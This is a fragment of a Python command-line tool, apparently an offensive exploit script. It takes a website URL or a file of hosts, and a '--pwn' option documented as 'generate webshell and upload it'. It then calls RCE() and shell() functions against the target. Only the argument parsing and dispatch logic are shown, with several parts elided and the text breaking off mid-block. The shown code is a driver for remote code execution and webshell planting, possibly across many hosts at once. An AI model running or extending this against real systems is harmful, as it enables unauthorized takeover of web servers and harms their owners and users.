...
parser.add_argument("-u", "--url", dest="U", type=str, help="Website Url")
parser.add_argument("-p", "--pwn", dest="P", type=str, help="generate webshell and upload it")
parser.add_argument("-l", "--list", dest="L", type=str, help="hosts File")

args = parser.parse_args()

if args.U is None and args.P is None and args.L is None:
    parser.print_help()
    sys.exit(0)

if args.U is not None and args.P is None and args.L is None:
...
elif args.P is not None and args.U is not None and args.L is None:
    print(bcolors.OKGREEN + banner + bcolors.ENDC)
    pwn = str(args.P)
    url = str(args.U)
    ...
    RCE(str(url) + "/", pwn)
    shell(str(url), pwn)
elif args.L is not None and args.P is None and args.U is None:
    print(bcolors.OKGREEN + banner + bcolors.ENDC)
    w = str(args.L)
    with open(w, "r") as f:
